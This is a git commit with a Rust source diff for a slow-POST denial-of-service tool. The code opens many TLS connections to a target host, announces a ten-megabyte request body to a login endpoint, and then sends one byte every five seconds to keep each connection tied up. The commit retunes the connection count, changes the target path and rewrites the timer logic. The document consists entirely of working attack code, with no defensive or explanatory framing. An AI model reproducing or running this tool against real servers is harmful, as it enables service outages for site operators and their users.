978318eee794c62b4165cb1688ee0143b9d83b26
Andrey Voronkov <voronkovaa@gmail.com>
2017-05-19 10:10:33 +0300

    We have advanced my precious.

--- src/main.rs
+++ src/main.rs
@@ -19,31 +19,33 @@ fn main() {
     let host = env::var("HOST").unwrap();
     let port = "443";
     let timeout = 5;
-    let connections_count = 2048;
+    let connections_count = 30;
 
     let mut core = Core::new().unwrap();
     let handle = core.handle();
 
-    let start = format!("POST /somepostpath HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
-    let connections_stream: Vec<Result<u32, ()>> = (0..connections_count).map(|i| Ok(i)).collect();
-    let runner = stream::iter(connections_stream).for_each(move |connection_number| {
+    let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
+    let timer = Timer::default();
+    for connection_number in 0..connections_count {
+        let timer = timer.clone();
         let connector = TlsConnector::builder().unwrap().build().unwrap();
         let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
         let mut stream = connector.connect(&host, stream).unwrap();
         stream.write(start.as_bytes());
         stream.flush();
 
-        let timer = Timer::default().interval(Duration::from_secs(timeout));
-        let timer = Interval::new(Duration::from_secs(timeout), &handle).unwrap();
-        let timer = timer.for_each(move |_| {
-            stream.write(b"a");
-            stream.flush();
-            println!("Stream number: {} written.", connection_number);
-            Ok(())
+        let lazy_wrapper = future::lazy(move || {
+            timer.interval(Duration::from_secs(timeout)).for_each(move |_| {
+                stream.write(b"a");
+                stream.flush();
+                println!("Stream number: {} written.", connection_number);
+                Ok(())
+            })
         });
-        let task = handle.spawn(timer.map_err(|_| println!("HIHI")));
+        let task = handle.spawn(lazy_wrapper.map_err(|_| panic!("HITHERE")));
         println!("Stream number: {} spawned.", connection_number);
-        Ok(())
-    });
-    core.run(runner);
+    }
+
+    let empty: futures::Empty<(), ()> = future::empty();
+    core.run(empty);
 }
